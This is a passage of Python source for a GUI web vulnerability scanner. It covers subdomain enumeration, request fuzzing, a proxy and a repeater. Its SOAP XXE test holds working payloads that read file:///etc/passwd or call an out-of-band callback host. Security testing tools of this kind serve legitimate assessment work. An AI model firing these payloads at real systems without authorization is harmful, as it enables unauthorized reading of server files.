    async def _validate_vulnerability(self, vuln):
        """
        Perform 3x validation on a vulnerability using the ValidationEngine
        """
        try:
            if not self.validation_engine:
                return
            
            self.log(f"[VALIDATION] Starting 3x validation for {vuln['type']} at {vuln['url']}")
            
            # Perform validation
            validated_vuln = await self.validation_engine.validate_finding(vuln)
            
            # Update the vulnerability in the list
            validation_status = validated_vuln.get('validation_results', {}).get('validation_status', 'unknown')
            final_confidence = validated_vuln.get('confidence', vuln.get('confidence', 0))
            
            # Update existing vulnerability
            for v in self.reporting_engine.vulnerabilities:
                if (v['type'] == vuln['type'] and 
                    v['url'] == vuln['url'] and 
                    v.get('parameter') == vuln.get('parameter')):
                    v.update(validated_vuln)
                    v['validation_pending'] = False
                    break
            
            # Log validation result
            self.log(f"[VALIDATION COMPLETE] {vuln['type']} - Status: {validation_status}, Final Confidence: {final_confidence}%")
            
            # If validation shows false positive, consider removing or flagging
            if validation_status == 'false_positive':
                self.log(f"[FALSE POSITIVE DETECTED] {vuln['type']} at {vuln['url']} - marked for review")
            
            # Re-emit finding with updated validation results
            self.add_finding(validated_vuln)
            
        except Exception as e:
            logging.error(f"Vulnerability validation error: {e}")
            vuln['validation_error'] = str(e)
            vuln['validation_pending'] = False
    
    async def temporal_recheck(self):
        """Recheck vulnerabilities after delay with confidence decay"""
        if not self.temporal_recheck_enabled:
            return
        
        self.log("Starting temporal recheck...")
        current_time = time.time()
        recheck_candidates = []
        
        for vuln_key, timestamp in self.vulnerability_timestamps.items():
            if current_time - timestamp >= self.recheck_delay:
                vuln_type, url, param = vuln_key
                recheck_candidates.append((vuln_type, url, param))
        
        for vuln_type, url, param in recheck_candidates:
            # Re-test the vulnerability
            self.log(f"Rechecking {vuln_type} at {url}")
            # This would trigger the specific test again
            # For now, we just update the timestamp and apply decay
            self.vulnerability_timestamps[(vuln_type, url, param)] = current_time
        
        self.log(f"Temporal recheck completed for {len(recheck_candidates)} vulnerabilities")

class SubdomainDiscovery:
    def __init__(self):
        self.discovered_subdomains = set()
    
    async def discover_from_ct_logs(self, domain):
        """Discover subdomains from Certificate Transparency logs (ASYNC VERSION)"""
        try:
            import aiohttp
            ct_url = f"https://crt.sh/?q=%.{domain}&output=json"
            async with aiohttp.ClientSession() as session:
                async with session.get(ct_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        entries = await response.json()
                        for entry in entries:
                            name_value = entry.get('name_value', '')
                            for subdomain in name_value.split('\n'):
                                subdomain = subdomain.strip()
                                if subdomain and subdomain.endswith(domain):
                                    self.discovered_subdomains.add(subdomain)
            return list(self.discovered_subdomains)
        except Exception as e:
            logging.warning(f"CT log discovery error: {e}")
            return []
    
    def dns_enumeration(self, domain):
        """Discover subdomains via DNS enumeration"""
        if not DNS_AVAILABLE:
            return []
        
        common_subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 'blog', 'shop', 'secure']
        discovered = []
        
        for sub in common_subdomains:
            full_domain = f"{sub}.{domain}"
            try:
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                answers = resolver.resolve(full_domain, 'A')
                if answers:
                    discovered.append(full_domain)
                    self.discovered_subdomains.add(full_domain)
            except Exception:
                pass
        
        return discovered
    
    def dns_bruteforce(self, domain, wordlist=None):
        """DNS bruteforce with custom wordlist"""
        if not DNS_AVAILABLE:
            return []
        
        if wordlist is None:
            wordlist = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 'blog', 'shop', 'secure',
                       'app', 'portal', 'dashboard', 'cdn', 'static', 'media', 'img', 'assets', 'v1', 'v2', 'api2']
        
        discovered = []
        for sub in wordlist:
            full_domain = f"{sub}.{domain}"
            try:
                resolver = dns.resolver.Resolver()
                resolver.timeout = 1
                resolver.lifetime = 1
                answers = resolver.resolve(full_domain, 'A')
                if answers:
                    discovered.append(full_domain)
                    self.discovered_subdomains.add(full_domain)
            except Exception:
                pass
        
        return discovered
    
    async def web_crawling(self, domain):
        """Discover subdomains by crawling main domain (ASYNC VERSION)"""
        try:
            import aiohttp
            from bs4 import BeautifulSoup
            
            urls = [f"http://{domain}", f"https://{domain}"]
            subdomains = set()
            
            async with aiohttp.ClientSession() as session:
                for url in urls:
                    try:
                        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                soup = BeautifulSoup(text, 'html.parser')
                                for link in soup.find_all('a', href=True):
                                    href = link['href']
                                    parsed = urlparse(href)
                                    if parsed.netloc and parsed.netloc != domain:
                                        if parsed.netloc.endswith(domain):
                                            subdomains.add(parsed.netloc)
                    except Exception:
                        pass
            
            self.discovered_subdomains.update(subdomains)
            return list(subdomains)
        except Exception as e:
            logging.warning(f"Web crawling discovery error: {e}")
            return []
    
    async def comprehensive_discovery(self, domain):
        """Run all discovery methods (ASYNC VERSION)"""
        self.discovered_subdomains.clear()
        
        self.log(f"Starting comprehensive subdomain discovery for {domain}")
        
        # CT Logs
        ct_results = await self.discover_from_ct_logs(domain)
        self.log(f"CT Logs: {len(ct_results)} subdomains")
        
        # DNS Enumeration
        dns_results = self.dns_enumeration(domain)
        self.log(f"DNS Enumeration: {len(dns_results)} subdomains")
        
        # DNS Bruteforce
        brute_results = self.dns_bruteforce(domain)
        self.log(f"DNS Bruteforce: {len(brute_results)} subdomains")
        
        # Web Crawling
        web_results = await self.web_crawling(domain)
        self.log(f"Web Crawling: {len(web_results)} subdomains")
        
        all_subdomains = list(self.discovered_subdomains)
        self.log(f"Total discovered: {len(all_subdomains)} subdomains")
        
        return all_subdomains
    
    def log(self, msg):
        logging.info(msg)

class ContentTypeAmbiguityAttack:
    """Test for content-type ambiguity vulnerabilities"""
    
    def __init__(self, session_manager):
        self.session_manager = session_manager
    
    async def test(self, url):
        """Test content-type ambiguity by sending conflicting headers"""
        try:
            payloads = [
                {'Content-Type': 'application/json', 'body': '<?xml version="1.0"?><test>data</test>'},
                {'Content-Type': 'text/xml', 'body': '{"test":"data"}'},
                {'Content-Type': 'application/xml', 'body': '{"test":"data"}'},
                {'Content-Type': 'text/html', 'body': '<?xml version="1.0"?><test>data</test>'},
            ]
            
            for payload in payloads:
                resp = await self._send_request(url, payload)
                if resp and self._detect_ambiguity(resp):
                    return {
                        "type": "Content-Type Ambiguity",
                        "url": url,
                        "evidence": f"Server accepted conflicting content-type: {payload['Content-Type']}",
                        "severity": "Medium",
                        "confidence": 75,
                        "cwe": CWE_MAP.get("Content-Type", "CWE-434")
                    }
        except Exception as e:
            logging.warning(f"Content-Type ambiguity test error: {e}")
        return None
    
    async def _send_request(self, url, payload):
        if not self.session_manager or not self.session_manager.async_session:
            return None
        try:
            async with self.session_manager.async_session.session.request(
                'POST', url, 
                headers={'Content-Type': payload['Content-Type']},
                data=payload['body'],
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                body = await resp.text()
                resp._body = body
                return resp
        except Exception:
            return None
    
    def _detect_ambiguity(self, resp):
        """Detect if server processed content ambiguously"""
        content_type = resp.headers.get('Content-Type', '')
        body_lower = resp._body.lower()
        # Check if response contains error or unexpected parsing
        return 'error' in body_lower or 'parse' in body_lower or 'invalid' in body_lower

class ProtobufThriftAmbiguityAttack:
    """Test for protobuf/thrift deserialization ambiguity"""
    
    def __init__(self, session_manager):
        self.session_manager = session_manager
    
    async def test(self, url):
        """Test protobuf/thrift ambiguity with malformed binary data"""
        try:
            # Send malformed protobuf-like data
            payloads = [
                b'\x08\x01\x12\x03mal',  # Malformed protobuf
                b'\x00\x01\x00\x02\x00\x03\x00\x04',  # Malformed thrift-like data
                b'\x0a\x03\x00\x00\x00\x00',  # Another malformed pattern
            ]
            
            for payload in payloads:
                resp = await self._send_request(url, payload)
                if resp and self._detect_deserialization_issue(resp):
                    return {
                        "type": "Protobuf/Thrift Deserialization Ambiguity",
                        "url": url,
                        "evidence": "Server accepted malformed binary data",
                        "severity": "High",
                        "confidence": 70,
                        "cwe": CWE_MAP.get("Deserialization", "CWE-502")
                    }
        except Exception as e:
            logging.warning(f"Protobuf/Thrift ambiguity test error: {e}")
        return None
    
    async def _send_request(self, url, payload):
        if not self.session_manager or not self.session_manager.async_session:
            return None
        try:
            async with self.session_manager.async_session.session.request(
                'POST', url,
                data=payload,
                headers={'Content-Type': 'application/x-protobuf'},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                body = await resp.text()
                resp._body = body
                return resp
        except Exception:
            return None
    
    def _detect_deserialization_issue(self, resp):
        """Detect deserialization issues"""
        body_lower = resp._body.lower()
        return any(err in body_lower for err in ['error', 'exception', 'invalid', 'parse', 'deserialize'])

class SoapXXEAttack:
    """Test for SOAP XXE vulnerabilities"""
    
    def __init__(self, session_manager, oob_manager):
        self.session_manager = session_manager
        self.oob_manager = oob_manager
    
    async def test(self, url):
        """Test SOAP XXE with various XML entities"""
        try:
            oob_domain = getattr(self.oob_manager, 'oob_dns_domain', 'oob.example.com')
            marker = f"soap_xxe_{uuid.uuid4().hex[:8]}"
            oob_url = f"http://{marker}.{oob_domain}"
            
            payloads = [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}">%xxe;]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>test</test></soap:Body></soap:Envelope>',
            ]
            
            for payload in payloads:
                resp = await self._send_request(url, payload)
                if resp:
                    # Check for XXE indicators
                    if self._detect_xxe(resp):
                        return {
                            "type": "SOAP XXE",
                            "url": url,
                            "evidence": "XXE vulnerability detected in SOAP endpoint",
                            "severity": "Critical",
                            "confidence": 85,
                            "cwe": CWE_MAP["XXE"]
                        }
                    
                    # Wait for OOB callback
                    await asyncio.sleep(2)
                    if self._check_oob_callback(marker):
                        return {
                            "type": "SOAP XXE (OOB)",
                            "url": url,
                            "evidence": f"OOB callback received: {marker}",
                            "severity": "Critical",
                            "confidence": 95,
                            "cwe": CWE_MAP["XXE"]
                        }
        except Exception as e:
            logging.warning(f"SOAP XXE test error: {e}")
        return None
    
    async def _send_request(self, url, payload):
        if not self.session_manager or not self.session_manager.async_session:
            return None
        try:
            async with self.session_manager.async_session.session.request(
                'POST', url,
                data=payload,
                headers={'Content-Type': 'application/soap+xml', 'SOAPAction': '"test"'},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                body = await resp.text()
                resp._body = body
                return resp
        except Exception:
            return None
    
    def _detect_xxe(self, resp):
        """Detect XXE in response"""
        body_lower = resp._body.lower()
        xxe_indicators = ['root:', 'bin:', 'etc/passwd', 'windows/system32', 'boot.ini']
        return any(indicator in body_lower for indicator in xxe_indicators)
    
    def _check_oob_callback(self, marker):
        """Check if OOB callback was received"""
        with oob_results_lock:
            for result in oob_results:
                if marker in result.get('path', ''):
                    return True
        return False

# ---------------------------------------------------------------------
# WORKER THREAD (QThread)
# ---------------------------------------------------------------------
class ScannerWorker(QThread):
    log = pyqtSignal(str)
    status = pyqtSignal(str)
    finding = pyqtSignal(dict)
    finished = pyqtSignal(dict)
    progress = pyqtSignal(int, int)  # current, total

    def __init__(self, target, config):
        super().__init__()
        self.target = target
        self.config = config
        self.loop = asyncio.new_event_loop()
        self.paused = False
        self.checkpoint_file = None

    def run(self):
        asyncio.set_event_loop(self.loop)
        self.scanner = OmegaDAST(self.target, self.config, self, loop=self.loop)
        try:
            self.loop.run_until_complete(self.scanner.scan())
        except Exception as e:
            self.log.emit(f"Scan error: {e}")

    def stop(self):
        self.scanner.stop_event.set()
    
    def pause(self):
        self.paused = True
        self.save_checkpoint()
        self.status.emit("Paused")
    
    def resume(self):
        self.paused = False
        checkpoint = self.load_checkpoint()
        if checkpoint:
            # Pass checkpoint data to scanner for restoration
            self.config['checkpoint_data'] = checkpoint
        self.status.emit("Resumed")
    
    def save_checkpoint(self):
        """Save current scan state to checkpoint file"""
        if self.scanner:
            checkpoint = {
                'target': self.target,
                'visited_urls': list(self.scanner.crawler_engine.visited_urls),
                'vulnerabilities': self.scanner.reporting_engine.vulnerabilities,
                'crawled_pages_count': len(self.scanner.crawler_engine.crawled_pages),
                'parameters_count': len(self.scanner.crawler_engine.parameters),
                'timestamp': datetime.now().isoformat()
            }
            self.checkpoint_file = f"checkpoint_{int(time.time())}.json"
            try:
                with open(self.checkpoint_file, 'w') as f:
                    json.dump(checkpoint, f, indent=2)
                self.log.emit(f"Checkpoint saved to {self.checkpoint_file}")
            except Exception as e:
                self.log.emit(f"Failed to save checkpoint: {e}")
    
    def load_checkpoint(self):
        """Load scan state from checkpoint file"""
        if self.checkpoint_file and os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, 'r') as f:
                    checkpoint = json.load(f)
                self.log.emit(f"Checkpoint loaded from {self.checkpoint_file}")
                return checkpoint
            except Exception as e:
                self.log.emit(f"Failed to load checkpoint: {e}")
        return None

# ---------------------------------------------------------------------
# SYNTAX HIGHLIGHTER
# ---------------------------------------------------------------------
class JsonSyntaxHighlighter(QSyntaxHighlighter):
    """Syntax highlighter for JSON content in evidence viewer"""
    def __init__(self, document):
        super().__init__(document)
        self.highlighting_rules = []
        
        # JSON key format (bold blue)
        key_format = QTextCharFormat()
        key_format.setForeground(QColor("#569CD6"))
        key_format.setFontWeight(QFont.Bold)
        self.highlighting_rules.append((r'"[^"]*"(?=:)', key_format))
        
        # JSON string value format (orange)
        string_format = QTextCharFormat()
        string_format.setForeground(QColor("#CE9178"))
        self.highlighting_rules.append((r':\s*"[^"]*"', string_format))
        
        # JSON number format (light green)
        number_format = QTextCharFormat()
        number_format.setForeground(QColor("#B5CEA8"))
        self.highlighting_rules.append((r':\s*\d+\.?\d*', number_format))
        
        # JSON boolean/null format (cyan)
        bool_format = QTextCharFormat()
        bool_format.setForeground(QColor("#569CD6"))
        self.highlighting_rules.append((r':\s*(true|false|null)', bool_format))
    
    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            import re
            for match in re.finditer(pattern, text):
                self.setFormat(match.start(), match.end() - match.start(), format)

# ---------------------------------------------------------------------
# GUI (Multi-tab with evidence, proxy, presets)
# ---------------------------------------------------------------------
class EvidenceDialog(QDialog):
    def __init__(self, evidence, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Evidence")
        layout = QVBoxLayout()
        text = QPlainTextEdit()
        text.setPlainText(json.dumps(evidence, indent=2) if evidence else "No evidence captured")
        text.setReadOnly(True)
        # Set monospaced font
        font = QFont("Consolas", 10)
        if not font.exactMatch():
            font = QFont("Courier New", 10)
        text.setFont(font)
        # Apply syntax highlighting
        self.highlighter = JsonSyntaxHighlighter(text.document())
        layout.addWidget(text)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(self.accept)
        layout.addWidget(buttons)
        self.setLayout(layout)

class RemediationDialog(QDialog):
    def __init__(self, cwe_id, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Remediation Guide")
        layout = QVBoxLayout()
        guide = CWE_RemediationGuide.get_guide(cwe_id)
        text = QPlainTextEdit()
        text.setPlainText(f"CWE: {cwe_id}\nName: {guide['name']}\n\nMitigation:\n{guide['mitigation']}")
        text.setReadOnly(True)
        layout.addWidget(text)
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(self.accept)
        layout.addWidget(buttons)
        self.setLayout(layout)

class ProxyTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Proxy controls
        control_layout = QHBoxLayout()
        self.port_spin = QSpinBox()
        self.port_spin.setRange(1024, 65535)
        self.port_spin.setValue(8080)
        self.start_proxy_btn = QPushButton("Start Proxy")
        self.start_proxy_btn.clicked.connect(self.toggle_proxy)
        self.clear_btn = QPushButton("Clear Captured")
        self.clear_btn.clicked.connect(self.clear_captured)
        control_layout.addWidget(QLabel("Port:"))
        control_layout.addWidget(self.port_spin)
        control_layout.addWidget(self.start_proxy_btn)
        control_layout.addWidget(self.clear_btn)
        layout.addLayout(control_layout)
        
        # Status label
        self.status_label = QLabel("Proxy stopped")
        layout.addWidget(self.status_label)
        
        # Captured requests table
        self.captured_table = QTableWidget()
        self.captured_table.setColumnCount(4)
        self.captured_table.setHorizontalHeaderLabels(["Method", "URL", "Status", "Body Size"])
        self.captured_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(QLabel("Captured Requests:"))
        layout.addWidget(self.captured_table)
        
        # Request details
        self.details_area = QPlainTextEdit()
        self.details_area.setReadOnly(True)
        layout.addWidget(QLabel("Request Details:"))
        layout.addWidget(self.details_area)
        
        self.proxy_handler = None
        self.proxy_running = False
        self.captured_table.cellDoubleClicked.connect(self.show_details)
    
    def toggle_proxy(self):
        if not self.proxy_running:
            self.proxy_handler = MITMProxyHandler(port=self.port_spin.value(), callback=self.on_captured)
            if self.proxy_handler.start():
                self.proxy_running = True
                self.start_proxy_btn.setText("Stop Proxy")
                self.status_label.setText("Proxy running on port %d" % self.port_spin.value())
            else:
                QMessageBox.warning(self, "Proxy Error", "Failed to start proxy")
        else:
            if self.proxy_handler:
                self.proxy_handler.stop()
            self.proxy_running = False
            self.start_proxy_btn.setText("Start Proxy")
            self.status_label.setText("Proxy stopped")
    
    def on_captured(self, request, status_code, response_body):
        row = self.captured_table.rowCount()
        self.captured_table.insertRow(row)
        self.captured_table.setItem(row, 0, QTableWidgetItem(request['method']))
        self.captured_table.setItem(row, 1, QTableWidgetItem(request['url']))
        self.captured_table.setItem(row, 2, QTableWidgetItem(str(status_code)))
        body_size = len(request['body']) if request['body'] else 0
        self.captured_table.setItem(row, 3, QTableWidgetItem(str(body_size)))
        self.captured_table.item(row, 0).setData(Qt.UserRole, request)
    
    def show_details(self, row, col):
        item = self.captured_table.item(row, 0)
        if item:
            request = item.data(Qt.UserRole)
            details = f"Method: {request['method']}\n"
            details += f"URL: {request['url']}\n"
            details += f"Headers:\n{json.dumps(request['headers'], indent=2)}\n"
            details += f"Body:\n{request['body'] if request['body'] else '(empty)'}"
            self.details_area.setPlainText(details)
    
    def clear_captured(self):
        self.captured_table.setRowCount(0)
        self.details_area.clear()
        if self.proxy_handler:
            self.proxy_handler.clear_captured()

class RepeaterTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout()
        self.setLayout(layout)
        
        # Request section
        form = QFormLayout()
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
        self.url_input = QLineEdit()
        self.headers_input = QPlainTextEdit()
        self.headers_input.setPlaceholderText("Headers (JSON format)")
        self.headers_input.setMaximumHeight(80)
        self.body_input = QPlainTextEdit()
        self.body_input.setPlaceholderText("Request body (JSON or form data)")
        self.body_input.setMaximumHeight(100)
        
        form.addRow("Method:", self.method_combo)
        form.addRow("URL:", self.url_input)
        form.addRow("Headers:", self.headers_input)
        form.addRow("Body:", self.body_input)
        layout.addLayout(form)
        
        # Send button
        btn_layout = QHBoxLayout()
        self.send_btn = QPushButton("Send Request")
        self.send_btn.clicked.connect(self.send_request)
        btn_layout.addWidget(self.send_btn)
        layout.addLayout(btn_layout)
        
        # Response section
        layout.addWidget(QLabel("Response:"))
        self.response_area = QPlainTextEdit()
        self.response_area.setReadOnly(True)
        layout.addWidget(self.response_area)
        
        # Status
        self.status_label = QLabel("Ready")
        layout.addWidget(self.status_label)
    
    def send_request(self):
        method = self.method_combo.currentText()
        url = self.url_input.text().strip()
        headers_text = self.headers_input.toPlainText().strip()
        body_text = self.body_input.toPlainText().strip()
        
        if not url:
            self.status_label.setText("Error: URL required")
            return
        
        try:
            headers = json.loads(headers_text) if headers_text else {}
            body = json.loads(body_text) if body_text else None
        except json.JSONDecodeError as e:
            self.status_label.setText(f"Error: Invalid JSON - {e}")
            return
        
        self.status_label.setText("Sending...")
        
        def send_in_thread():
            try:
                import aiohttp
                import asyncio
                
                async def async_send():
                    async with aiohttp.ClientSession() as session:
                        if method == "GET":
                            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "POST":
                            async with session.post(url, headers=headers, json=body, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "PUT":
                            async with session.put(url, headers=headers, json=body, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "DELETE":
                            async with session.delete(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "PATCH":
                            async with session.patch(url, headers=headers, json=body, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "HEAD":
                            async with session.head(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = ""
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        elif method == "OPTIONS":
                            async with session.options(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text()
                                status = resp.status
                                resp_headers = dict(resp.headers)
                        else:
                            raise ValueError(f"Unsupported method: {method}")
                        
                        return status, resp_headers, text
                
                # Use new_event_loop instead of asyncio.run() to avoid issues in thread
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    status, resp_headers, text = loop.run_until_complete(async_send())
                finally:
                    loop.close()
                
                response_text = f"Status: {status}\n"
                response_text += f"Headers:\n{json.dumps(resp_headers, indent=2)}\n\n"
                response_text += f"Body:\n{text}"
                
                self.response_area.setPlainText(response_text)
                self.status_label.setText(f"Completed - {status}")
            except Exception as e:
                self.response_area.setPlainText(f"Error: {str(e)}")
                self.status_label.setText("Error")
        
        threading.Thread(target=send_in_thread, daemon=True).start()

class ScanTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        layout = QVBoxLayout()
        self.setLayout(layout)
        form = QFormLayout()
        self.url_input = QLineEdit("http://testphp.vulnweb.com/")
        self.depth_spin = QSpinBox(); self.depth_spin.setRange(1,10); self.depth_spin.setValue(3)
        self.threads_spin = QSpinBox(); self.threads_spin.setRange(1,200); self.threads_spin.setValue(5)
        self.delay_spin = QDoubleSpinBox(); self.delay_spin.setRange(0.0,5.0); self.delay_spin.setValue(0.2)
        self.conf_spin = QSpinBox(); self.conf_spin.setRange(0,100); self.conf_spin.setValue(75)
        self.js_check = QCheckBox("JS Rendering"); self.js_check.setChecked(True)
        form.addRow("URL:", self.url_input)
        form.addRow("Depth:", self.depth_spin)
        form.addRow("Threads:", self.threads_spin)
        form.addRow("Delay:", self.delay_spin)
        form.addRow("Confidence:", self.conf_spin)
        form.addRow(self.js_check)
        layout.addLayout(form)
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("Start"); self.start_btn.clicked.connect(self.start_scan)
        self.stop_btn = QPushButton("Stop"); self.stop_btn.clicked.connect(self.stop_scan)
        self.pause_btn = QPushButton("Pause"); self.pause_btn.clicked.connect(self.pause_scan)
        self.resume_btn = QPushButton("Resume"); self.resume_btn.clicked.connect(self.resume_scan)
        self.stop_btn.setEnabled(False)
        self.pause_btn.setEnabled(False)
        self.resume_btn.setEnabled(False)
        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        btn_layout.addWidget(self.pause_btn)
        btn_layout.addWidget(self.resume_btn)
        layout.addLayout(btn_layout)
        
        # Progress bar with task count
        progress_layout = QHBoxLayout()
        self.progress_bar = QProgressBar()
        self.progress_label = QLabel("Ready")
        progress_layout.addWidget(self.progress_label)
        progress_layout.addWidget(self.progress_bar)
        layout.addLayout(progress_layout)
        
        self.log_area = QTextEdit(); self.log_area.setReadOnly(True); self.log_area.setFont(QFont("Courier New",9))
        self.findings_table = QTableWidget()
        self.findings_table.setColumnCount(6)
        self.findings_table.setHorizontalHeaderLabels(["Type","URL","Parameter","Confidence","Severity","CWE"])
        self.findings_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.findings_table.cellDoubleClicked.connect(self.show_evidence)
        self.findings_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.findings_table.customContextMenuRequested.connect(self.show_context_menu)
        layout.addWidget(QLabel("Log:"))
        layout.addWidget(self.log_area)
        layout.addWidget(QLabel("Findings:"))
        layout.addWidget(self.findings_table)
        self.worker = None
        self.fp_db = FP_Database()
        self.total_tasks = 0
        self.current_task = 0

    def start_scan(self):
        target = self.url_input.text().strip()
        if not target: return
        if not target.startswith(('http://','https://')): target = 'http://'+target
        
        # Get webhook URLs from main window
        main_window = self.window()
        jira_webhook = getattr(main_window, 'jira_webhook_url', '')
        slack_webhook = getattr(main_window, 'slack_webhook_url', '')
        
        config = {
            'depth': self.depth_spin.value(),
            'threads': self.threads_spin.value(),
            'delay': self.delay_spin.value(),
            'confidence_threshold': self.conf_spin.value(),
            'js_render': self.js_check.isChecked(),
            'oob_ip': None,
            'oob_dns_ip': None,
            'capture_evidence': True,
            'jira_webhook': jira_webhook,
            'slack_webhook': slack_webhook,
        }
        self.worker = ScannerWorker(target, config)
        self.worker.log.connect(self.log_area.append)
        self.worker.finding.connect(self.add_finding)
        self.worker.finished.connect(self.scan_finished)
        self.worker.progress.connect(self.update_progress)
        self.worker.status.connect(self.update_status)
        self.worker.start()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.pause_btn.setEnabled(True)
        self.resume_btn.setEnabled(False)
        self.progress_bar.setValue(0)
        self.progress_label.setText("Starting scan...")

    def stop_scan(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.log_area.append("[!] Stopping...")
            self.stop_btn.setEnabled(False)
            self.pause_btn.setEnabled(False)
            self.resume_btn.setEnabled(False)
    
    def pause_scan(self):
        if self.worker and self.worker.isRunning():
            self.worker.pause()
            self.pause_btn.setEnabled(False)
            self.resume_btn.setEnabled(True)
    
    def resume_scan(self):
        if self.worker and self.worker.isRunning():
            self.worker.resume()
            self.pause_btn.setEnabled(True)
            self.resume_btn.setEnabled(False)
    
    def update_progress(self, current, total):
        self.current_task = current
        self.total_tasks = total
        if total > 0:
            progress = int((current / total) * 100)
            self.progress_bar.setValue(progress)
            self.progress_label.setText(f"Progress: {current}/{total} tasks ({progress}%)")
    
    def update_status(self, status):
        self.progress_label.setText(f"Status: {status}")

    def add_finding(self, vuln):
        row = self.findings_table.rowCount()
        self.findings_table.insertRow(row)
        self.findings_table.setItem(row, 0, QTableWidgetItem(vuln.get('type','')))
        self.findings_table.setItem(row, 1, QTableWidgetItem(vuln['url']))
        self.findings_table.setItem(row, 2, QTableWidgetItem(vuln.get('parameter','')))
        self.findings_table.setItem(row, 3, QTableWidgetItem(str(vuln.get('confidence',''))))
        self.findings_table.setItem(row, 4, QTableWidgetItem(vuln.get('severity','')))
        self.findings_table.setItem(row, 5, QTableWidgetItem(vuln.get('cwe','')))
        self.findings_table.item(row, 0).setData(Qt.UserRole, vuln)
    
    def show_context_menu(self, pos):
        item = self.findings_table.itemAt(pos.row(), 0)
        if item:
            vuln = item.data(Qt.UserRole)
            menu = QMenu()
            mark_fp_action = menu.addAction("Mark as False Positive")
            show_remediation_action = menu.addAction("Show Remediation Guide")
            action = menu.exec_(self.findings_table.mapToGlobal(pos))
            if action == mark_fp_action:
                self.fp_db.record_fp(vuln)
                self.log_area.append(f"[FP] Marked {vuln['type']} at {vuln['url']} as false positive")
                self.findings_table.removeRow(pos.row())
            elif action == show_remediation_action:
                cwe_id = vuln.get('cwe', '')
                if cwe_id:
                    dlg = RemediationDialog(cwe_id, self)
                    dlg.exec_()
                    
    def show_evidence(self, row, col):
        item = self.findings_table.item(row, 0)
        if item:
            vuln = item.data(Qt.UserRole)
            if vuln and 'full_evidence' in vuln:
                dlg = EvidenceDialog(vuln['full_evidence'], self)
                dlg.exec_()
            elif vuln:
                dlg = EvidenceDialog(vuln, self)
                dlg.exec_()

    def scan_finished(self, report):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.pause_btn.setEnabled(False)
        self.resume_btn.setEnabled(False)
        self.progress_bar.setValue(100)
        self.log_area.append(f"\nScan complete. {len(report['vulnerabilities'])} findings.")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("UltraDAST v11.9 – Unstoppable Pentester")
        self.resize(1400, 900)
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)
        self.add_new_scan_tab()
        self.add_repeater_tab()
        self.add_proxy_tab()
        self.dark_mode = False
        
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        toolbar = self.addToolBar("Tools")
        add_action = QAction("New Scan Tab", self)
        add_action.triggered.connect(self.add_new_scan_tab)
        toolbar.addAction(add_action)
        
        dark_mode_action = QAction("Toggle Dark Mode", self)
        dark_mode_action.triggered.connect(self.toggle_dark_mode)
        toolbar.addAction(dark_mode_action)
        
        self.statusBar().showMessage("Ready")
    
    def create_menu_bar(self):
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("File")
